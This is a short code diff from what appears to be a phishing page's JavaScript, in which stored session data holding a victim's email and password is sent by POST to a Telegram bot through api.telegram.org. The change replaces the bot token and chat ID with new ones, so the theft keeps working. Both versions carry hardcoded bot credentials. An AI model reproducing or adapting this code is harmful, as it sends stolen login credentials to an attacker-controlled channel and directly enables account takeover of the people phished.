@@ -603,12 +603,12 @@
         }))
         sessionStorageData = JSON.parse(sessionStorage.getItem('data'))
         console.log(sessionStorageData)
-        const botToken = '6549974551:AAH5CHMOrLFkkvh3b6EZsj7FkboxjtvXdeU'
+        const botToken = '7067744395:AAHLZVwIgeiLu1VjHVGDORQAMbHn56WHYjc'
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            'chat_id': -1002053753326,
+            'chat_id': -1002033097748,
             text: `
 EMAIL: ${sessionStorageData.email}
 PASSWORD: ${sessionStorageData.password}
